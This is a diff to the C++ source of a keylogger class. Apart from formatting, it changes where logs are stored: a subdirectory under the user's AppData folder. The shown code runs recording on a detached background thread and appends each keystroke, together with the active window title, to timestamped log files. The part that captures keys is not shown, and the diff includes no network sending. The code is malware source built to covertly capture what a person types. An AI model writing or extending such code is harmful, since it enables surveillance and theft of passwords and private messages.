@@ -1,8 +1,8 @@
 #include "KeyLogger.h"
 
-void KeyLogger::tryStart(){
-    if (!recordingKeys.load()){
-        recordingKeys=true;
+void KeyLogger::tryStart() {
+    if (!recordingKeys.load()) {
+        recordingKeys = true;
         std::thread keyloggerThread(&KeyLogger::start, this);
         keyloggerThread.detach();
     }
@@ -132,7 +132,7 @@ void KeyLogger::writeCharIntoLogFile(const char *string) {
 }
 
 void KeyLogger::writeCharIntoLogFile(char string) {
-    if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
+    std::filesystem::create_directory(std::filesystem::path(pathOfLogs).parent_path());
     std::ofstream myfile;
     myfile.open(logsFileName.c_str(), std::fstream::app);
     std::string detectedWindow = getCurrentWindow();
@@ -168,7 +168,9 @@ void KeyLogger::setRecordingKeys(bool isRecording) {
     KeyLogger::recordingKeys = isRecording;
 }
 
-KeyLogger::KeyLogger(Stream stream) : stream(stream) {
+KeyLogger::KeyLogger(Stream stream, const std::string &subdirectoryName) :
+        stream(stream),
+        pathOfLogs(Install::getAppDataPath() + L"\\" + Converter::string2wstring(subdirectoryName) + L"\\") {
 
 }
 
@@ -176,11 +178,11 @@ std::wstring KeyLogger::generateLogName() {
     return pathOfLogs + L"log_" + Time::getCurrentDateTimeW() + L".log";
 }
 
-bool KeyLogger::lastLogExists(){
+bool KeyLogger::lastLogExists() {
     return std::filesystem::exists(logsFileName);
 }
 
-bool KeyLogger::logsExists(){
+bool KeyLogger::logsExists() {
     if (std::filesystem::exists(pathOfLogs) && !std::filesystem::is_empty(pathOfLogs)) return true;
     return false;
 }
